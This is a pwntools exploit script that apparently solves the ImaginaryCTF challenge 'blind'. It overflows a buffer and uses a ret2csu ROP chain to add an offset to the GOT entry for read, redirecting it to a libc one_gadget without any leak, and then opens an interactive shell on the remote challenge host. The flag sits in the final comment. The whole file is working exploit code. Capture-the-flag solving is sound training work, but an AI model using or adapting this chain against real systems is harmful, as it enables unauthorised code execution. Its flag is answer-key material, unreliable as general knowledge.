from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./libc-2.31.so")
elf = ELF("./vuln")
gadget = 0xE3AFE
csu = 0x4011CA  # rbx, rbp, r12, r13, r14, r15
add = 0x40111C  # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
# io = gdb.debug('./vuln', 'b *(main+45)\nc')
# io = process('./vuln')
io = remote("blind.chal.imaginaryctf.org", 1337)
io.sendline(
    b"a" * 40
    + flat(
        [
            csu,
            gadget - libc.sym["read"],
            elf.got["read"] + 0x3D,
            0,
            0,
            0,
            0,
            add,
            elf.sym["main"],
        ]
    )
)
io.interactive()
# ictf{did_y0u_just_pwN_me_with0ut_leakS??}
